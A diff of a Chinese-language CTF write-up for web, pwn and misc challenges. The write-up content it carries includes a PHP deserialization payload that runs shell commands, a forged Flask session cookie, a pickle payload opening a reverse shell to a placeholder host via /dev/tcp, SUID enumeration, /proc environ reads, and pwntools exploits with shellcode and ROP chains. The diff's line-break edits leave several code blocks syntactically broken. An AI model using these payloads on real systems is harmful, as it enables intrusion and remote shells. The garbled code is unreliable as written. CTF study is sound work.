@@ -15,7 +15,8 @@ D0n’t pl4y g4m3!!!
 
 <?php
 header("HTTP/1.1 302 found");
-header("Location:https://passer-by.com/pacman/");
+header("Location:
+https://passer-by.com/pacman/");
 
 class Pro{
     private $exp;
@@ -147,7 +148,8 @@ def verification():
         attribute = session.get('Attribute')
         if not isinstance(attribute, dict):
             raise Exception
-    except Exception:
+    
+except Exception:
         return 'Hacker!!!'
     if attribute.get('name') == 'admin':
         if attribute.get('admin') == 1:
@@ -189,7 +191,8 @@ def ppppppppppick1e():
             return "Go for it!!!"
         else:
             return "No Way!!!"
-    except Exception as e:
+    
+except Exception as e:
         error_message = str(e)
         return error_message
 
@@ -443,7 +446,8 @@ for i in range(256):
     try:
         pwn()
         p.interactive()
-    except:
+    
+except:
         p.close()
 
 Misc
@@ -480,7 +484,8 @@ https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28303
 
 github找复现工具https://github.com/frankthetank-music/Acropalypse-Multi-Tool/releases/tag/v1.0.0
 
-最后恢复出截图，得到flag:CvE_1s_V3Ry_intEr3sting!!
+最后恢复出截图，得到flag:
+CvE_1s_V3Ry_intEr3sting!!
 
 Matryoshka
 
@@ -510,7 +515,8 @@ base32解得到
 ```
 <?php
 header("HTTP/1.1 302 found");
-header("Location:https://passer-by.com/pacman/");
+header("Location:
+https://passer-by.com/pacman/");
 
 class Pro{
     private $exp;
@@ -580,11 +586,6 @@ if (isset($a)){
   unserialize(prohib($a));
 }
 ?>
-```
-
-
-
-```
 <?php
 class Cheng{
     public $name;
@@ -626,17 +627,7 @@ $ser = str_replace("s:12","s:6",$ser);
 echo urlencode($ser);
 
 ?>
-```
-
-
-
-```
 O%3A3%3A%22Bei%22%3A4%3A%7Bs%3A3%3A%22CTF%22%3BO%3A4%3A%22Yang%22%3A2%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A1%3A%7Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bs%3A6%3A%22finish%22%3B%7D%7Ds%3A3%3A%22now%22%3Ba%3A1%3A%7Bs%3A4%3A%22YCB1%22%3Bs%3A6%3A%22syssystemtem%22%3B%7D%7Ds%3A4%3A%22fine%22%3BO%3A4%3A%22Yang%22%3A2%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A1%3A%7Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bs%3A6%3A%22finish%22%3B%7D%7Ds%3A3%3A%22now%22%3Ba%3A1%3A%7Bs%3A4%3A%22YCB1%22%3Bs%3A6%3A%22syssystemtem%22%3B%7D%7Ds%3A3%3A%22rce%22%3Bs%3A23%3A%22cat+%2Ftmp%2Fcatcatf1ag.txt%22%3Bs%3A4%3A%22rce1%22%3Ba%3A1%3A%7Bs%3A2%3A%22ls%22%3Bs%3A2%3A%22ls%22%3B%7D%7D
-```
-
-
-
-```
 from flask import Flask, session
 from secret import secret
 
@@ -646,7 +637,8 @@ def verification():
         attribute = session.get('Attribute')
         if not isinstance(attribute, dict):
             raise Exception
-    except Exception:
+    
+except Exception:
         return 'Hacker!!!'
     if attribute.get('name') == 'admin':
         if attribute.get('admin') == 1:
@@ -658,19 +650,9 @@ def verification():
 
 if __name__ == '__main__':
     app.run('0.0.0.0', port=80)
-```
-
-
-
-```
 # 解密session就可以看到secret_key
 python3 .flask_session_cookie_manager3.py encode  -s 'GWHT1GGAvNAKvF' -t '{"Attribute":{"admin":1,"name":"admin","secret_key":"GWHT1GGAvNAKvF"}}'
 eyJBdHRyaWJ1dGUiOnsiYWRtaW4iOjEsIm5hbWUiOiJhZG1pbiIsInNlY3JldF9rZXkiOiJHV0hUMUdHQXZOQUt2RiJ9fQ.ZPK8mg.MEjHXayV-z1qvaSJZHGyAr2btl8
-```
-
-
-
-```
 @app.route('/src0de')
 def src0de():
     f = open(__file__, 'r')
@@ -694,7 +676,8 @@ def ppppppppppick1e():
             return "Go for it!!!"
         else:
             return "No Way!!!"
-    except Exception as e:
+    
+except Exception as e:
         error_message = str(e)
         return error_message
 
@@ -706,11 +689,6 @@ class GWHT():
 
 if __name__ == '__main__':
     app.run('0.0.0.0', port=80)
-```
-
-
-
-```
 import base64
 
 opcode = b'''(cos
@@ -718,11 +696,6 @@ system
 S'bash -i >& /dev/tcp/xxx.xxx.xx.xxx/Port 0>&1'
 o.'''
 print(base64.b64encode(opcode))
-```
-
-
-
-```
 www-data@out-0:/$ find / -user root -perm /4000 2>/dev/null
 find / -user root -perm /4000 2>/dev/null
 /usr/bin/chfn
@@ -743,17 +716,7 @@ SyntaxError: unexpected EOF while parsing
 www-data@out-0:/$ python3.8 -c 'print(open("/flag").read())'
 python3.8 -c 'print(open("/flag").read())'
 DASCTF{96457914264959329419758606761175}
-```
-
-
-
-```
 /read?file=/proc/1/environ
-```
-
-
-
-```
 import requests, re, time
 
 url = "http://5000.endpoint-64c8f01c2b234d718b0e628fd789c642.m.ins.cloud.dasctf.com:81"
@@ -773,11 +736,6 @@ for m in maps:
     if rt:
         print(rt)
 # 3c6f721f*34fe*4cc6*bc0f*7bd6884afbeb
-```
-
-
-
-```
 from pwn import *
 
 context.log_level='debug'
@@ -818,15 +776,10 @@ p.sendafter(b'======',b'x53x58x5ex5ex5ex50x5fx5ax56x5cx5ax52x56x50x58x56xc3')
 p.send(b'aa'+code)
 p.interactive()
 p.close()
-```
-
-
-
-```
 from pwn import*
 context(arch='i386', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
-#libc = ELF("../libc/")
+    #libc = ELF("../libc/")
 # libc = ELF("./libc-so.6")
 """""
 def xxx():
@@ -903,15 +856,10 @@ shell = p64(pop_rdi)+ p64(binsh) + p64(system)
 add(0x100,payloa.ljust(0xa8,b"B")+b"./flagx00x00" +payload,mode=False)#3 
 
 p.interactive()
-```
-
-
-
-```
 from pwn import*
 context(arch='i386', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
-#libc = ELF("../libc/")
+    #libc = ELF("../libc/")
 libc = ELF("./libc-so.6")
 """""
 def xxx():
@@ -944,7 +892,8 @@ for i in range(256):
     try:
         pwn()
         p.interactive()
-    except:
+    
+except:
         p.close()
 ```
 
